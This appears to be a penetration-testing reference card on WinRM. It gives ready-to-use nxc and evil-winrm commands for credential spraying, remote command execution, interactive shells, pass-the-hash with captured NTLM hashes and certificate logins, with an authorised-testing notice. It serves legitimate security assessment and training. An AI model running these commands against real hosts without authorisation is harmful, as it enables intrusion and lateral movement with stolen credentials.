---
service: winrm
title: WinRM (Windows Remote Management)
ports: 5985, 5986
aliases: wsman, winrm-http, winrm-https
---

# WinRM — quick wins

**When you see it:** 5985/tcp open (HTTP) or 5986/tcp (HTTPS) and `nxc winrm H -u U -p P`
returns `[+] ... (Pwn3d!)` → the user has `Remote Management Users` or local admin rights
and an interactive PowerShell session is one command away.

> Authorized testing only. This is a thin attack surface — without credentials or a hash,
> WinRM yields nothing. Steps marked ✏️ execute commands on the target.

## Triage (read-only)
```sh
nxc winrm H -u '' -p ''           # check if port responds; no anon auth
curl -s http://H:5985/wsman        # HTTP 401 = WinRM present; no body = filtered
nmap -Pn -p5985,5986 H             # confirm ports open
```

## Quick wins

### Credential validation
```sh
nxc winrm H -u U -p P
nxc winrm H -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```
*Why:* nxc tests whether the account belongs to `Remote Management Users` or has local
admin. A `(Pwn3d!)` marker means `evil-winrm` will open an interactive shell. No creds =
nothing useful here — pivot to SMB/Kerberos attacks first.

### Privilege snapshot ✏️
```sh
nxc winrm H -u U -p P -x 'whoami /priv && whoami /groups && hostname'
```
*Why:* Quick one-liner to confirm privilege level and group membership before opening a
full shell — useful for deciding whether to proceed or escalate first.

### Interactive shell with password ✏️
```sh
evil-winrm -i H -u U -p P
```
*Why:* Drops into a PowerShell session with history, tab-complete, and upload/download
built in (`upload`, `download` commands). Full PowerShell access on the target.

### Pass-the-hash shell (no cleartext needed) ✏️
```sh
evil-winrm -i H -u U -H NTLMHASH
# Or via nxc:
nxc winrm H -u U -H NTLMHASH
```
*Why:* WinRM uses NTLM authentication — the NT hash alone is sufficient. Pair with hashes
captured from SAM dump, secretsdump, or Mimikatz. Only the NT portion of the full hash is
needed.

### HTTPS / certificate-based (5986) ✏️
```sh
evil-winrm -i H -u U -p P -S              # ignore self-signed cert
evil-winrm -i H -u U -c cert.pem -k key.pem -S   # client cert auth
```
*Why:* 5986 uses TLS — useful when the HTTP endpoint is firewalled. Client certificate
auth is rare but sometimes configured on hardened management hosts.

## aranum helpers
- `aranumtoolkit/network/enum-winrm.sh` — runs nxc winrm cred check and privilege
  snapshot; emits evil-winrm hint to `_hints.txt` for hosts that pass.
- `aranumtoolkit/network/bulk-enum-windows.py` — mass WinRM check across a target list,
  correlating results from SMB/Kerberos/RDP dispatchers into a single findings file.
- `standalones/creds/hash-format.py` — format captured hashes for PTH input.

## Gotchas
- WinRM is only enabled by default on Windows Server; workstations require `Enable-PSRemoting`
  or GPO push. An open 5985 on a workstation is a deliberate config — high value target.
- `Remote Management Users` group membership is sufficient for a shell but not for admin
  actions — check token privileges. `SeDebugPrivilege` or `SeImpersonatePrivilege` in
  `whoami /priv` output = local escalation likely available.
- 5986 with a self-signed cert will fail without `-S` (`--ssl`) or cert trust — always
  pass `-S` when targeting 5986.
- PTH via evil-winrm requires the full NT hash (32 hex chars); NTLM (LM:NT colon-form)
  is also accepted — `hash-format.py` handles the conversion.
- WinRM traffic is logged to `Microsoft-Windows-WinRM/Operational` on the target —
  assume your session is visible in a monitored environment.

## Sources
- HackTricks `winrm`; Hackviser WinRM pentesting;
  evil-winrm README (Hackplayers/evil-winrm); NetExec wiki WinRM.
